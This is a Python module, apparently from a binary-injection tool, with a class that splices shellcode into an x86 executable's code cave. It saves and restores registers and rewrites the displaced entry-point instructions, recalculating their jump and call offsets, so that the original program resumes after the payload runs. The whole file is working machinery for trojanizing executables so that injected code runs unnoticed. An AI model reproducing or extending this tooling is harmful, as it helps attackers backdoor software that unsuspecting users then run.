from __future__ import annotations
import sys
from struct import pack
from inject.common import CommonMixin
from inject.enums import (
    IX86_PUSHAD,
    IX86_PUSHFD,
    IX86_POPAD,
    IX86_JUMP,
    IX86_NOP,
    X86OP,
)
from inject.utils import intbyte, byteslash


class Restorer(CommonMixin):
    def __init__(self, options: dict = None):
        options = options or {}
        self.data: bytes = None
        self.jump_to_address: int = -1
        self.cave_address: int = -1
        self.ep_relative: int = -1  # should be original, not new-section
        self.nop_data: bool = options.get("nop_restore_data", False)
        self.should_restore = options.get("should_restore", True)
        super().__init__(options)

    def get_expected_size(self, shellcode: Shellcode):
        self.data_required()

        return (
            len(IX86_PUSHAD)
            + len(shellcode.shellcode)
            + len(self.data)
            + len(IX86_POPAD)
            # + len(IX86_JUMP)  # jump backs, should this be here?
        )

    def apply(self, shellcode: Shellcode):
        self.out("-- Restoring --")
        self.check_requirements()
        size_when_restoring = self.get_expected_size(shellcode)
        self.out(f"[*] Shellcode Size When Restoring: {size_when_restoring}")
        self.outhexi(f"Restore Cave Address", self.cave_address)
        restore_current_address = self.cave_address + size_when_restoring

        if self.nop_data:
            self.out(f"[*] Replacing Restoration data with NOPs")
            self.data = IX86_NOP * len(self.data)
        else:
            restore_ep_relative = self.ep_relative
            original_restore_data = self.data
            self.data = self.generate_recalculated_data(
                original_restore_data, restore_current_address
            )
            added_bytes = len(self.data) - len(original_restore_data)
            restore_current_address = restore_current_address + added_bytes
            if added_bytes > 0:
                self.out(f"[*] Adding {added_bytes} to Current Address")

        self.outhexi(f"Restore Current Address", restore_current_address)
        self.outhexi(f"Restore New Entry Address", self.jump_to_address)
        jmp_op = self.build_restore_jump_op(restore_current_address)
        return IX86_PUSHAD + shellcode.shellcode + IX86_POPAD + self.data + jmp_op

    def build_restore_jump_op(self, current_address):
        jump_to_address = self.jump_to_address
        # go backwards
        if jump_to_address < current_address:
            new_entry_loc = (current_address + 5 - jump_to_address) * -1
            self.outhexi(f"Final Jump To Address (Back)", new_entry_loc)
            return IX86_JUMP + pack("=l", new_entry_loc)
        # go forwards
        new_entry_loc = current_address + 5 - jump_to_address
        self.outhexi(f"Final Jump To Address (Forward)", new_entry_loc)
        return IX86_JUMP + pack("=L", new_entry_loc)

    def generate_recalculated_data(self, data: bytes, current_address) -> bytes:
        corrected_data = bytes()
        added_bytes = 0
        current_offset = 0
        prior_offset = 0
        ins = self.get_ins_from_data(data, offset=self.ep_relative)
        for i in ins:
            asm = "%s %s" % (i.mnemonic, i.op_str)
            prior_offset = current_offset
            current_offset += len(i.bytes)
            original_jump_op = data[
                prior_offset:current_offset
            ]  # grab current instruction bytes

            opcode = intbyte(original_jump_op[0])  # extract first opcode byte
            if X86OP.knows_value(opcode):
                self.out(f"[*] Restoration Instruction: {asm}")
                op = X86OP(opcode)
                if op.is_jmp_call() and op.is_short():
                    self.out(
                        f"[*] Changing JMP/CALL {op.name} to short version {op.deshort().name}"
                    )
                    op = op.deshort()
                current_address = current_address + added_bytes
                if op.is_jmp_call():
                    intended = int(
                        asm.split(" ")[1], 16
                    )  # get the intended destination
                    self.outhexi(f"Original Intended Destination", intended)
                    op_offset = 5 if not op.is_conditional_jmp_call() else 6
                    jump_address = self.calculated_new_jump_location(
                        intended, current_address, op_offset
                    )
                    self.outhexi(f"New Intended Destination", jump_address)
                    jump_op = bytes(op) + pack("=l", jump_address)
                    self.out(
                        f"[*] Original Jump/Call Operation: {byteslash(original_jump_op)}",
                    )
                    self.out(f"[*] New Jump/Call Operation: {byteslash(jump_op)}",)

                else:
                    jump_op = original_jump_op
            else:
                self.out(f"[*] Skipping restoration opcode: '{byteslash(opcode)}'",)

                jump_op = original_jump_op

            corrected_data += jump_op
            added_bytes += len(jump_op) - len(original_jump_op)

        return corrected_data

    def calculated_new_jump_location(self, intended, current_address, offset):
        # backwards
        if intended < current_address:
            self.out(f"[*] Retoration direction: backwards")
            return (current_address - intended + offset) * -1
        # forwards
        self.out(f"[*] Retoration direction: forwards")
        return current_address - intended + offset  # forwards jump

    def check_requirements(self):
        self.data_required()
        self.jump_to_address_required()
        self.cave_address_required()
        self.ep_relative_required()

    def data_required(self):
        if not self.data:
            print(
                "[!] Restore data not known. Cannot restore. Either tell Shellcode the restore data or disable restoration."
            )
            print("[!] Injection failed.")
            sys.exit(1)

    def jump_to_address_required(self):
        if not self.jump_to_address >= 0:
            print(
                "[!] Return Jump To Address is not known by Shellcode instance. Cannot restore. Either tell Shellcode the jump to address or disable restoration."
            )
            print("[!] Injection failed.")
            sys.exit(1)

    def cave_address_required(self):
        if not self.cave_address >= 0:
            print(
                "[!] Return Cave Address is not known by Shellcode instance. Cannot restore. Either tell Shellcode the cave address or disable restoration."
            )
            print("[!] Injection failed.")
            sys.exit(1)

    def ep_relative_required(self):
        if not self.ep_relative >= 0:
            print(
                "[!] Restore relative entrypoint (ep_ava) is not known by Shellcode instance. Cannot restore. Either tell Shellcode the ep or disable restoration."
            )
            print("[!] Injection failed.")
            sys.exit(1)
